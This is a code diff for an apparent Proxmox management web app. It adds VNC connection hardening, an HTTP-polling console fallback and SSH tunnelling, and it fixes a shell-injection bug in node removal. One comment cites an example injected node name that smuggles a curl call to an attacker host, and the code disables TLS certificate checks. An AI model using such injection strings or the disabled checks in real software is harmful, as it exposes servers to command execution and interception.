@@ -10,6 +10,7 @@ import threading
 import uuid
 import hashlib
 import re
+import shlex
 import ssl
 import socket
 from datetime import datetime, timedelta, timezone
@@ -34,6 +35,37 @@ import requests.exceptions
 from pegaprox.api.realtime import sock
 
 bp = Blueprint('vms', __name__)
+
+
+# MK Apr 2026 — VNC connection hardening helpers. We keep the proxy path through
+# pegaprox (most customer browsers can't reach the PVE node directly), so the
+# resilience has to come from the proxy code itself. These helpers apply OS-level
+# keepalive and a shared connect timeout that's long enough for slow corporate
+# inspection middleboxes (TLS DPI, Falcon-style EDR scoring) to finish their work.
+VNC_PVE_CONNECT_TIMEOUT = int(os.environ.get('PEGAPROX_VNC_CONNECT_TIMEOUT', '15'))
+
+
+def _apply_vnc_socket_options(sock):
+    """Apply TCP_NODELAY + aggressive TCP keepalive to a VNC-forwarding socket.
+
+    Stateful firewalls / EDR-network-filters often drop "established" TCP sessions
+    that look idle. RFB has natural quiet periods (user reading, no mouse/key
+    activity). Default Linux keepalive is 2h idle which doesn't help. 15s idle +
+    5s probe interval + 3 misses survives most enterprise conntrack timeouts.
+    Best-effort — failures are logged debug, not raised."""
+    try:
+        import socket as _s
+        sock.setsockopt(_s.IPPROTO_TCP, _s.TCP_NODELAY, 1)
+        sock.setsockopt(_s.SOL_SOCKET, _s.SO_KEEPALIVE, 1)
+        if hasattr(_s, 'TCP_KEEPIDLE'):
+            sock.setsockopt(_s.IPPROTO_TCP, _s.TCP_KEEPIDLE, 15)
+        if hasattr(_s, 'TCP_KEEPINTVL'):
+            sock.setsockopt(_s.IPPROTO_TCP, _s.TCP_KEEPINTVL, 5)
+        if hasattr(_s, 'TCP_KEEPCNT'):
+            sock.setsockopt(_s.IPPROTO_TCP, _s.TCP_KEEPCNT, 3)
+    except Exception as _e:
+        logging.debug(f"[VNC] socket options not fully applied: {_e}")
+
 
 # =====================================================
 # DATACENTER / CLUSTER CONFIGURATION API
@@ -2526,7 +2558,16 @@ def remove_node_from_cluster(cluster_id, node_name):
     # MK: IP must be resolved BEFORE delnode or we might wipe the wrong node!
     ok, err = check_cluster_access(cluster_id)
     if not ok: return err
-    
+
+    # MK Apr 2026 — Validate node_name strictly. URL-routed param flows into
+    # `pvecm delnode {node_name}` via SSH (line ~2617). Without validation, a
+    # request like .../nodes/pve1;curl%20attacker/cluster-membership becomes a
+    # shell-injection chain even though the route is gated to cluster.admin.
+    # PVE/Debian node names follow RFC-1035-ish DNS rules: letter-led, then
+    # letters/digits/hyphens, max ~63 chars. Reject anything else.
+    if not re.match(r'^[a-zA-Z][a-zA-Z0-9.\-]{0,62}$', node_name or ''):
+        return jsonify({'success': False, 'error': 'Invalid node name'}), 400
+
     if cluster_id not in cluster_managers:
         return jsonify({'error': 'Cluster not found'}), 404
     
@@ -2613,8 +2654,10 @@ def remove_node_from_cluster(cluster_id, node_name):
         if not connected:
             return jsonify({'success': False, 'error': 'Could not authenticate via SSH. Configure SSH key or password.'}), 500
         
-        # Execute pvecm delnode command
-        cmd = f'pvecm delnode {node_name}'
+        # Execute pvecm delnode command. MK Apr 2026: shlex.quote belt-and-braces
+        # — node_name is already regex-validated at the top of the function,
+        # but the second layer keeps things safe if the regex ever loosens.
+        cmd = f'pvecm delnode {shlex.quote(node_name)}'
         stdin, stdout, stderr = ssh.exec_command(cmd, timeout=60)
         
         exit_code = stdout.channel.recv_exit_status()
@@ -3208,8 +3251,221 @@ def get_console_ticket(cluster_id, node, vm_type, vmid):
         # NS: log who opened the console
         usr = request.session.get('user', 'unknown')
         log_audit(usr, 'vm.console', f'VNC console opened: {vm_type}/{vmid} on {node}', cluster=mgr.config.name)
+
+        # MK Apr 2026 — Stable VNC Mode (D). Frontend opt-in via ?stable=1.
+        # Returns an additional AES-256-GCM session key + handle the WS handler
+        # picks up on connect. Inner-encryption layer survives TLS-inspection
+        # middleboxes that re-encrypt the outer TLS and modify binary RFB bytes.
+        if request.args.get('stable') == '1':
+            try:
+                from pegaprox.utils import vnc_crypto
+                import base64 as _b64
+                import secrets as _secrets
+                key = vnc_crypto.generate_session_key()
+                sid = _secrets.token_urlsafe(16)
+                vnc_crypto.stash_session_key(sid, key)
+                result['stable'] = {
+                    'session_id': sid,
+                    'key_b64': _b64.b64encode(key).decode('ascii'),
+                    'frame_format': 'aes256-gcm-seq32-iv96',
+                    'protocol_version': 1,
+                }
+            except Exception as _enc_err:
+                logging.warning(f"[VNC] stable-mode key generation failed (falling back to plain): {_enc_err}")
+
         return jsonify(result)
     return jsonify({'error': result.get('error', 'Failed')}), 500
+
+
+# MK Apr 2026 — HTTP-polling fallback for the VNC proxy. Used when the WS
+# leg between browser and PegaProx is killed by a security middlebox (rare
+# but real: CrowdStrike with WS DPI on, Zscaler strict mode). Same auth, same
+# Stable-Mode crypto, same SSH tunnel for the second leg — only the transport
+# changes from "one persistent WSS" to "many short HTTPS POSTs". Higher latency,
+# but goes through anything that allows plain HTTPS.
+@bp.route('/api/clusters/<cluster_id>/vms/<node>/<vm_type>/<int:vmid>/vnc-poll', methods=['POST'])
+@require_auth()
+def vnc_poll(cluster_id, node, vm_type, vmid):
+    """Action-dispatched HTTP-polling endpoint for VNC.
+
+    Body shapes:
+      {action: 'open',  enc_session?: '...'}    -> {ok, poll_id, ...}
+      {action: 'send',  poll_id, data_b64}      -> {ok, sent}
+      {action: 'recv',  poll_id, max_wait?}     -> {ok, chunks_b64, closed}
+      {action: 'close', poll_id}                -> {ok}
+    """
+    from pegaprox.utils import vnc_polling as _poll
+    body = request.get_json(silent=True) or {}
+    action = body.get('action')
+
+    # All actions need cluster + perm checks
+    ok, err = check_cluster_access(cluster_id)
+    if not ok: return err
+    if cluster_id not in cluster_managers:
+        return jsonify({'error': 'Cluster not found'}), 404
+
+    users = load_users()
+    user = users.get(request.session['user'], {})
+    user['username'] = request.session['user']
+    mgr = cluster_managers[cluster_id]
+    console_perm = 'xapi.vm.view' if getattr(mgr, 'cluster_type', 'proxmox') == 'xcpng' else 'vm.console'
+    if not user_can_access_vm(user, cluster_id, vmid, console_perm, vm_type):
+        return jsonify({'error': f'Permission denied: {console_perm}'}), 403
+
+    if vm_type not in ('qemu', 'lxc'):
+        return jsonify({'error': 'invalid vm_type'}), 400
+
+    # ───── action: open ─────
+    if action == 'open':
+        # acquire PVE auth + vncproxy ticket (mirrors the WS handler flow)
+        import urllib.request, urllib.parse, json as _json, ssl as _ssl
+        import websocket as ws_client
+        import base64 as _b64
+        host = mgr.host
+
+        ssl_ctx = _ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = _ssl.CERT_NONE
+
+        try:
+            login_data = urllib.parse.urlencode({
+                'username': mgr.config.user,
+                'password': mgr.config.pass_,
+            }).encode('utf-8')
+            login_req = urllib.request.Request(
+                f"https://{host}:8006/api2/json/access/ticket", data=login_data, method='POST'
+            )
+            with urllib.request.urlopen(login_req, context=ssl_ctx, timeout=10) as r:
+                login_result = _json.loads(r.read().decode('utf-8'))
+            pve_ticket = login_result['data']['ticket']
+            csrf_token = login_result['data']['CSRFPreventionToken']
+
+            # MK Apr 2026 (#352 follow-up) — same single-vncproxy fix applies
+            # to the polling endpoint. If JS provides pve_port + pve_ticket in
+            # the open body, reuse them so noVNC's RFB password matches PVE's.
+            pve_port_q = body.get('pve_port')
+            pve_ticket_q = body.get('pve_ticket')
+            if pve_port_q and pve_ticket_q:
+                vnc_ticket = pve_ticket_q
+                vnc_port = pve_port_q
+            else:
+                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/{vm_type}/{vmid}/vncproxy"
+                vnc_req = urllib.request.Request(vnc_url, data=urllib.parse.urlencode({'websocket': '1'}).encode('utf-8'), method='POST')
+                vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
+                vnc_req.add_header('CSRFPreventionToken', csrf_token)
+                with urllib.request.urlopen(vnc_req, context=ssl_ctx, timeout=10) as r:
+                    vnc_result = _json.loads(r.read().decode('utf-8'))
+                vnc_ticket = vnc_result['data']['ticket']
+                vnc_port = vnc_result['data']['port']
+        except Exception as e:
+            return jsonify({'error': f'pve auth/proxy failed: {e}'}), 502
+
+        encoded_ticket = url_quote(vnc_ticket, safe='')
+        pve_ws_path = f"/api2/json/nodes/{node}/{vm_type}/{vmid}/vncwebsocket?port={vnc_port}&vncticket={encoded_ticket}"
+
+        # Optional SSH tunnel (same path as WS handler)
+        tunnel_endpoint = None
+        target_host = host
+        target_port = 8006
+        try:
+            if bool(getattr(mgr.config, 'vnc_tunnel', False)):
+                from pegaprox.utils import vnc_tunnel as _vt
+                _ssh_user = getattr(mgr.config, 'ssh_user', None) or (mgr.config.user or 'root').split('@')[0]
+                _ssh_port = getattr(mgr.config, 'ssh_port', 22) or 22
+                tunnel_endpoint = _vt.acquire(
+                    cluster_id=cluster_id, pve_host=host,
+                    ssh_user=_ssh_user, ssh_port=_ssh_port,
+                    ssh_key_content=getattr(mgr.config, 'ssh_key', '') or '',
+                    ssh_password=getattr(mgr.config, 'pass_', '') or '',
+                    target_host='127.0.0.1', target_port=8006,
+                )
+                target_host = '127.0.0.1'
+                target_port = tunnel_endpoint.local_port
+                logging.info(f"[VncPoll] tunnel routed via 127.0.0.1:{target_port} → SSH → {host}:8006")
+        except Exception as te:
+            logging.warning(f"[VncPoll] tunnel setup failed ({te}) — direct WSS to PVE")
+            tunnel_endpoint = None
+            target_host = host
+            target_port = 8006
+
+        pve_ws_url = f"wss://{target_host}:{target_port}{pve_ws_path}"
+        try:
+            pve_ws = ws_client.create_connection(
+                pve_ws_url,
+                sslopt={"cert_reqs": _ssl.CERT_NONE},
+                header={"Cookie": f"PVEAuthCookie={pve_ticket}", "Host": f"{host}:8006"},
+                timeout=VNC_PVE_CONNECT_TIMEOUT,
+            )
+            _apply_vnc_socket_options(pve_ws.sock)
+        except Exception as e:
+            try:
+                if tunnel_endpoint: tunnel_endpoint.stop()
+            except Exception: pass
+            return jsonify({'error': f'pve ws connect failed: {e}'}), 502
+
+        # Optional Stable-Mode crypto
+        crypto_session = None
+        enc_sid = body.get('enc_session')
+        if enc_sid:
+            try:
+                from pegaprox.utils import vnc_crypto as _vc
+                key = _vc.claim_session_key(enc_sid)
+                if key:
+                    crypto_session = _vc.VncCryptoSession(key)
+            except Exception as ce:
+                logging.warning(f"[VncPoll] crypto setup failed ({ce}) — plain mode")
+
+        sess = _poll.VncPollSession(
+            poll_id=_poll.new_poll_id(),
+            pve_ws=pve_ws,
+            tunnel_endpoint=tunnel_endpoint,
+            crypto_session=crypto_session,
+            cluster_id=cluster_id,
+            vm_type=vm_type,
+            vmid=vmid,
+            host=host,
+        )
+        _poll.register(sess)
+        log_audit(request.session.get('user', 'unknown'), 'vm.console',
+                  f'VNC poll session opened: {vm_type}/{vmid} on {node}', cluster=mgr.config.name)
+        logging.info(f"[VncPoll] open id={sess.poll_id[:8]} {vm_type}/{vmid}@{node} crypto={'on' if crypto_session else 'off'} tunnel={'on' if tunnel_endpoint else 'off'}")
+        return jsonify({
+            'ok': True,
+            'poll_id': sess.poll_id,
+            'transport': 'http-polling',
+            'recv_max_wait': _poll.RECV_LONG_POLL_DEFAULT,
+        })
+
+    # All other actions require an existing poll_id
+    poll_id = body.get('poll_id') or ''
+    sess = _poll.get(poll_id)
+    if not sess:
+        return jsonify({'error': 'unknown or expired poll session'}), 404
+    if sess.cluster_id != cluster_id or sess.vm_type != vm_type or sess.vmid != vmid:
+        return jsonify({'error': 'poll session does not match resource'}), 403
+
+    if action == 'send':
+        try:
+            n = sess.send(body.get('data_b64', ''))
+        except Exception as e:
+            return jsonify({'error': f'send failed: {e}', 'closed': sess.closed}), 502
+        return jsonify({'ok': True, 'sent': n})
+
+    if action == 'recv':
+        max_wait = float(body.get('max_wait', 5.0) or 5.0)
+        chunks = sess.recv(max_wait=max_wait)
+        import base64 as _b64
+        return jsonify({
+            'ok': True,
+            'chunks_b64': [_b64.b64encode(c).decode('ascii') for c in chunks],
+            'closed': sess.closed,
+        })
+
+    if action == 'close':
+        _poll.drop(poll_id)
+        return jsonify({'ok': True})
+
+    return jsonify({'error': f'unknown action {action!r}'}), 400
 
 
 @bp.route('/api/clusters/<cluster_id>/nodes/<node>/shell', methods=['POST'])
@@ -5572,29 +5828,36 @@ def handle_vnc_websocket(ws, cluster_id, node, vm_type, vmid):
         
         with urllib.request.urlopen(login_req, context=ssl_context, timeout=10) as response:
             login_result = json.loads(response.read().decode('utf-8'))
-        
+
         pve_ticket = login_result['data']['ticket']
         csrf_token = login_result['data']['CSRFPreventionToken']
         print(f"Got PVE ticket")
-        
-        # Step 2: Get VNC ticket
-        print(f"Step 2: Get VNC ticket...")
-        if vm_type == 'qemu':
-            vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+
+        # MK Apr 2026 (#352 follow-up) — single-vncproxy mode. If the JS
+        # already got a vncproxy ticket+port via /console, reuse it so the VNC
+        # password noVNC uses matches the password PVE's vncterm expects. PVE
+        # 9.1.x generates fresh random VNC password per vncproxy call.
+        pve_port_q = request.args.get('pve_port')
+        pve_ticket_q = request.args.get('pve_ticket')
+        if pve_port_q and pve_ticket_q:
+            vnc_ticket = pve_ticket_q
+            port = pve_port_q
+            print(f"Reusing JS-issued vncproxy ticket port={port}")
         else:
-            vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
-        
-        vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
-        vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
-        vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
-        vnc_req.add_header('CSRFPreventionToken', csrf_token)
-        
-        with urllib.request.urlopen(vnc_req, context=ssl_context, timeout=10) as response:
-            vnc_result = json.loads(response.read().decode('utf-8'))
-        
-        vnc_ticket = vnc_result['data']['ticket']
-        port = vnc_result['data']['port']
-        print(f"Got VNC ticket, port={port}")
+            print(f"Step 2: Get VNC ticket...")
+            if vm_type == 'qemu':
+                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+            else:
+                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
+            vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
+            vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
+            vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
+            vnc_req.add_header('CSRFPreventionToken', csrf_token)
+            with urllib.request.urlopen(vnc_req, context=ssl_context, timeout=10) as response:
+                vnc_result = json.loads(response.read().decode('utf-8'))
+            vnc_ticket = vnc_result['data']['ticket']
+            port = vnc_result['data']['port']
+            print(f"Got VNC ticket, port={port} (no JS pass-through — PVE 9.1.x users may hit issue #352)")
         
         # Step 3: Connect to Proxmox WebSocket
         print(f"Step 3: Connect to Proxmox...")
@@ -5606,14 +5869,16 @@ def handle_vnc_websocket(ws, cluster_id, node, vm_type, vmid):
             pve_ws_path = f"/api2/json/nodes/{node}/lxc/{vmid}/vncwebsocket?port={port}&vncticket={encoded_vnc_ticket}"
         
         pve_ws_url = f"wss://{host}:8006{pve_ws_path}"
-        
+
         pve_ws = websocket.create_connection(
             pve_ws_url,
             sslopt={"cert_reqs": ssl.CERT_NONE},
             header={"Cookie": f"PVEAuthCookie={pve_ticket}"},
-            timeout=5
+            timeout=VNC_PVE_CONNECT_TIMEOUT
         )
-        
+        # MK Apr 2026 — TCP_NODELAY + keepalive: survives idle conntrack drops
+        _apply_vnc_socket_options(pve_ws.sock)
+
         print(f"✓ Connected to Proxmox!")
         pve_ws.settimeout(0.1)
         
@@ -5801,6 +6066,25 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
         # LW: backwards compat, accept session= too for now
         session_id = query_params.get('session', [None])[0]
 
+        # MK Apr 2026 — Stable VNC Mode (D): if frontend asked for an encrypted
+        # tunnel via /console?stable=1, it gets back an enc_session id which it
+        # then passes here. We claim the matching AES-256-GCM key (one-shot,
+        # auto-expires after 60s if never claimed) and use it to wrap forwarded
+        # frames in both directions. None → plain mode (default, backwards-compat).
+        crypto_session = None
+        enc_sid = query_params.get('enc_session', [None])[0]
+        if enc_sid:
+            try:
+                from pegaprox.utils import vnc_crypto as _vc
+                _key = _vc.claim_session_key(enc_sid)
+                if _key:
+                    crypto_session = _vc.VncCryptoSession(_key)
+                    print(f"[VNC] stable mode active for sid={enc_sid[:8]}...")
+                else:
+                    print(f"[VNC] enc_session={enc_sid[:8]}... not found / expired — falling back to plain mode")
+            except Exception as _e:
+                print(f"[VNC] crypto setup failed ({_e}) — falling back to plain mode")
+
         if ws_token:
             from pegaprox.utils.realtime import validate_ws_token
             token_data = validate_ws_token(ws_token)
@@ -5880,28 +6164,52 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
                 data=login_data, method='POST'
             )
 
-            with urllib.request.urlopen(login_req, context=ssl_ctx, timeout=10) as response:
-                login_result = json.loads(response.read().decode('utf-8'))
+            # MK Apr 2026 — wrap synchronous urllib.urlopen in asyncio.to_thread
+            # so concurrent VNC handlers don't serialize on the TLS handshake.
+            import asyncio as _aiowrap
+            def _do_urlopen(req):
+                with urllib.request.urlopen(req, context=ssl_ctx, timeout=10) as r:
+                    return r.read()
+            login_body = await _aiowrap.to_thread(_do_urlopen, login_req)
+            login_result = json.loads(login_body.decode('utf-8'))
 
             pve_ticket = login_result['data']['ticket']
             csrf_token = login_result['data']['CSRFPreventionToken']
 
-            # Request VNC proxy ticket (must connect to WS within ~10s)
-            if vm_type == 'qemu':
-                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+            # MK Apr 2026 — issue #352 follow-up. Single-vncproxy fast path.
+            # If the JS already obtained a vncproxy ticket+port via /console
+            # (which it always does — that's where it gets the VNC RFB password
+            # for noVNC), reuse THAT ticket here instead of issuing a fresh
+            # vncproxy call. PVE 9.1.x generates a random VNC password per
+            # vncproxy call. Two calls = two different passwords; noVNC sends
+            # DES(password_A) but PVE's vncterm is initialised with password_B,
+            # so RFB auth fails (the customer-visible recv=60B + ttfb≈1s pattern).
+            # Older PVE was tolerant because passwords were derived from the
+            # ticket prefix. Newer PVE is strict.
+            pve_port_q = query_params.get('pve_port', [None])[0]
+            pve_ticket_q = query_params.get('pve_ticket', [None])[0]
+            if pve_port_q and pve_ticket_q:
+                # Single-vncproxy mode: trust the caller-supplied port+ticket.
+                vnc_ticket = pve_ticket_q
+                port = pve_port_q
+                logging.info(f"[VNC] reusing JS-issued vncproxy ticket port={port} (single-call mode)")
             else:
-                vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
-
-            vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
-            vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
-            vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
-            vnc_req.add_header('CSRFPreventionToken', csrf_token)
-
-            with urllib.request.urlopen(vnc_req, context=ssl_ctx, timeout=10) as response:
-                vnc_result = json.loads(response.read().decode('utf-8'))
-
-            vnc_ticket = vnc_result['data']['ticket']
-            port = vnc_result['data']['port']
+                # Backwards-compat fallback: issue our own vncproxy. This still
+                # works on older PVE where two vncproxy calls produce matching
+                # passwords (or where noVNC isn't used in the browser).
+                if vm_type == 'qemu':
+                    vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/qemu/{vmid}/vncproxy"
+                else:
+                    vnc_url = f"https://{host}:8006/api2/json/nodes/{node}/lxc/{vmid}/vncproxy"
+                vnc_data = urlencode({'websocket': '1'}).encode('utf-8')
+                vnc_req = urllib.request.Request(vnc_url, data=vnc_data, method='POST')
+                vnc_req.add_header('Cookie', f'PVEAuthCookie={pve_ticket}')
+                vnc_req.add_header('CSRFPreventionToken', csrf_token)
+                vnc_body = await _aiowrap.to_thread(_do_urlopen, vnc_req)
+                vnc_result = json.loads(vnc_body.decode('utf-8'))
+                vnc_ticket = vnc_result['data']['ticket']
+                port = vnc_result['data']['port']
+                logging.warning(f"[VNC] no pve_port/pve_ticket in URL — issued fresh vncproxy (port={port}). Update the frontend to pass JS-issued ticket through to avoid PVE 9.1.x password-mismatch (issue #352).")
 
             encoded_vnc_ticket = url_quote(vnc_ticket, safe='')
 
@@ -5910,24 +6218,106 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
             else:
                 pve_ws_path = f"/api2/json/nodes/{node}/lxc/{vmid}/vncwebsocket?port={port}&vncticket={encoded_vnc_ticket}"
 
-            pve_ws_url = f"wss://{host}:8006{pve_ws_path}"
+            # MK Apr 2026 — VNC SSH-Tunnel-Mode (D2 / second leg).
+            # If the cluster is flagged with vnc_tunnel=True, we open a persistent
+            # SSH connection to the PVE node and forward localhost:RAND→pve:8006
+            # through it. The WSS connection then goes to localhost:RAND instead
+            # of pve:8006, so the WSS bytes ride inside SSH which TLS-inspection
+            # engines can't decrypt (no trust-anchor for the SSH host key).
+            # Multi-user: each session gets its own ephemeral local port.
+            tunnel_endpoint = None
+            tunnel_target_host = host
+            tunnel_target_port = 8006
+            try:
+                _use_tunnel = bool(getattr(manager.config, 'vnc_tunnel', False))
+            except Exception:
+                _use_tunnel = False
 
-            pve_ws = ws_client.create_connection(
+            if _use_tunnel:
+                try:
+                    from pegaprox.utils import vnc_tunnel as _vt
+                    _ssh_user = getattr(manager.config, 'ssh_user', None) or (manager.config.user or 'root').split('@')[0]
+                    _ssh_port = getattr(manager.config, 'ssh_port', 22) or 22
+                    _ssh_key = getattr(manager.config, 'ssh_key', '') or ''
+                    _ssh_pass = getattr(manager.config, 'pass_', '') or ''
+                    # MK Apr 2026 — _vt.acquire() is sync. On the *first* call for a
+                    # cluster it builds the SSH transport (~1-2s on a fast LAN, more
+                    # over WAN). If we ran it directly on the event loop, that 1-2s
+                    # blocks websockets.serve from completing opening handshakes for
+                    # other concurrent connections — which is exactly the "5/5 timed
+                    # out during opening handshake" we saw in the multi-user test.
+                    # Offload to a worker so the event loop stays free.
+                    import asyncio as _aio_acq
+                    tunnel_endpoint = await _aio_acq.to_thread(
+                        _vt.acquire,
+                        cluster_id=cluster_id,
+                        pve_host=host,
+                        ssh_user=_ssh_user,
+                        ssh_port=_ssh_port,
+                        ssh_key_content=_ssh_key,
+                        ssh_password=_ssh_pass,
+                        target_host='127.0.0.1',
+                        target_port=8006,
+                    )
+                    # Reroute the WSS through the local listener
+                    tunnel_target_host = '127.0.0.1'
+                    tunnel_target_port = tunnel_endpoint.local_port
+                    logging.info(
+                        f"[VNC] SSH tunnel mode active for cluster={cluster_id}: "
+                        f"WSS routed via 127.0.0.1:{tunnel_target_port} → SSH → {host}:8006"
+                    )
+                except Exception as _tun_err:
+                    logging.warning(
+                        f"[VNC] SSH tunnel setup failed ({_tun_err}) — falling back "
+                        f"to direct WSS to {host}:8006. Customer may still see "
+                        "TLS-inspection issues until SSH is fixed."
+                    )
+                    tunnel_endpoint = None
+                    tunnel_target_host = host
+                    tunnel_target_port = 8006
+
+            pve_ws_url = f"wss://{tunnel_target_host}:{tunnel_target_port}{pve_ws_path}"
+
+            # MK Apr 2026 (#352 follow-up) — auth-context for the PVE WS upgrade.
+            # When we're REUSING the JS-issued vncproxy ticket, the ticket was
+            # bound to the manager's existing auth context (API token or stored
+            # access cookie). Using a fresh login's cookie produces "permission
+            # denied - invalid PVEVNC ticket" on PVE 9.1.x. Reuse the manager's
+            # stored auth instead. Backwards-compat path keeps the fresh login.
+            ws_auth_header = {"Host": f"{host}:8006"}
+            if pve_port_q and pve_ticket_q:
+                if getattr(manager, '_using_api_token', False) and getattr(manager, '_api_token', None):
+                    ws_auth_header['Authorization'] = f"PVEAPIToken={manager._api_token}"
+                elif getattr(manager, '_ticket', None):
+                    ws_auth_header['Cookie'] = f"PVEAuthCookie={manager._ticket}"
+                else:
+                    ws_auth_header['Cookie'] = f"PVEAuthCookie={pve_ticket}"
+            else:
+                ws_auth_header['Cookie'] = f"PVEAuthCookie={pve_ticket}"
+
+            # MK Apr 2026 — ws_client.create_connection is synchronous; offload to
+            # a worker thread so concurrent VNC handlers don't serialize on the
+            # TLS+WS-Upgrade handshake (~1-2s each) on the event loop.
+            import asyncio as _asyncio_for_connect
+            import time as _t_connect
+            _connect_started = _t_connect.monotonic()
+            pve_ws = await _asyncio_for_connect.to_thread(
+                ws_client.create_connection,
                 pve_ws_url,
                 sslopt={"cert_reqs": ssl.CERT_NONE},
-                header={"Cookie": f"PVEAuthCookie={pve_ticket}"},
-                timeout=5
+                header=ws_auth_header,
+                timeout=VNC_PVE_CONNECT_TIMEOUT,
             )
+            _connect_ms = int((_t_connect.monotonic() - _connect_started) * 1000)
 
-            # NS Apr 2026: disable Nagle — VNC is interactive (key/mouse = small packets),
-            # Nagle can add up to 40ms of buffering lag which feels awful
-            try:
-                import socket as _socket
-                pve_ws.sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
-            except Exception as _e:
-                logging.debug(f"[VNC] TCP_NODELAY on pve_ws not set: {_e}")
+            # MK Apr 2026: TCP_NODELAY + aggressive keepalive (replaces older NS comment).
+            # Nagle off = no 40ms input lag for keystrokes/mouse; keepalive on = stateful
+            # firewalls don't drop the session during natural idle periods.
+            _apply_vnc_socket_options(pve_ws.sock)
 
-            logging.debug(f"[VNC] connected to {host} for {vm_type}/{vmid}")
+            logging.info(f"[VNC] connected to {host} for {vm_type}/{vmid} in {_connect_ms}ms")
+            if _connect_ms > 3000:
+                logging.warning(f"[VNC] slow PVE connect: {_connect_ms}ms — possible TLS-inspection / EDR latency on the path to {host}")
 
             import asyncio
 
@@ -5935,6 +6325,10 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
             bytes_received = 0
             running = True
             stop_evt = asyncio.Event()
+            # MK Apr 2026 — time-to-first-byte from PVE side; helps distinguish
+            # "couldn't connect" from "connected but stuck mid-handshake" in support
+            _ttfb_ms = None
+            _session_started = _t_connect.monotonic()
 
             # NS Apr 2026 (#312/#92): the old loop used settimeout(0.001) + asyncio.sleep(0.005)
             # to fake non-blocking recv. That's a busy-wait that blocks the event loop on every
@@ -5943,17 +6337,28 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
             pve_ws.settimeout(None)  # blocking mode — to_thread handles the blocking call
 
             async def proxmox_to_client():
-                """Forward data from Proxmox to browser (blocking recv handled in thread)"""
-                nonlocal bytes_received, running
+                """Forward data from Proxmox to browser (blocking recv handled in thread).
+
+                In Stable VNC Mode (crypto_session is not None): plain RFB bytes
+                from PVE are wrapped in an AES-256-GCM frame before they hit the
+                browser-side WebSocket. The middlebox can re-encrypt our outer
+                TLS but sees opaque ciphertext inside, so it can't pattern-match
+                or modify the binary RFB.
+                """
+                nonlocal bytes_received, running, _ttfb_ms
                 while running:
                     try:
                         data = await asyncio.to_thread(pve_ws.recv)
                         if not data:
                             running = False
                             break
+                        if _ttfb_ms is None:
+                            _ttfb_ms = int((_t_connect.monotonic() - _session_started) * 1000)
                         bytes_received += len(data)
                         if isinstance(data, str):
                             data = data.encode('latin-1')
+                        if crypto_session is not None:
+                            data = crypto_session.encrypt(data)
                         await websocket.send(data)
                     except ws_client.WebSocketConnectionClosedException:
                         running = False
@@ -5966,7 +6371,15 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
                 stop_evt.set()
 
             async def client_to_proxmox():
-                """Forward data from browser to Proxmox (blocking send handled in thread)"""
+                """Forward data from browser to Proxmox (blocking send handled in thread).
+
+                In Stable VNC Mode: each browser-side WebSocket frame is an
+                AES-256-GCM ciphertext blob. We unwrap it (which also verifies
+                the auth tag — if a middlebox modified bytes mid-flight, decrypt
+                raises and we close the session with code 4099 and a clear
+                'integrity check failed' reason instead of letting RFB later
+                fail with a confusing 'Authentication failed').
+                """
                 nonlocal bytes_sent, running
                 try:
                     async for message in websocket:
@@ -5975,6 +6388,21 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
                         bytes_sent += len(message)
                         if isinstance(message, str):
                             message = message.encode('latin-1')
+                        if crypto_session is not None:
+                            try:
+                                message = crypto_session.decrypt(message)
+                            except Exception as _crypto_err:
+                                logging.warning(
+                                    f"[VNC] integrity check FAILED on browser→PVE frame "
+                                    f"(host={host} vm={vm_type}/{vmid}): {_crypto_err}. "
+                                    "TLS-inspection / EDR is modifying packets mid-flight."
+                                )
+                                running = False
+                                try:
+                                    await websocket.close(4099, f"integrity_check_failed: {_crypto_err}")
+                                except Exception:
+                                    pass
+                                break
                         await asyncio.to_thread(pve_ws.send, message)
                 except Exception as e:
                     if running and 'close' not in str(e).lower():
@@ -6050,16 +6478,43 @@ def start_vnc_websocket_server(port=5001, ssl_cert=None, ssl_key=None, host='0.0
                 except asyncio.CancelledError:
                     pass
             
-            logging.debug(f"[VNC] session ended: sent {bytes_sent}B, received {bytes_received}B")
+            # MK Apr 2026 — richer session-end diagnostic. Helps support correlate
+            # short / weird sessions with network / inspection issues. Format is
+            # easy to grep + machine-parseable.
+            _duration_ms = int((_t_connect.monotonic() - _session_started) * 1000)
+            _ttfb_str = f"{_ttfb_ms}ms" if _ttfb_ms is not None else "never"
+            _short_session = _duration_ms < 5000 and bytes_received < 4096
+            _level = logging.WARNING if _short_session else logging.INFO
+            logging.log(
+                _level,
+                f"[VNC] session ended host={host} vm={vm_type}/{vmid} "
+                f"connect={_connect_ms}ms ttfb={_ttfb_str} duration={_duration_ms}ms "
+                f"sent={bytes_sent}B recv={bytes_received}B "
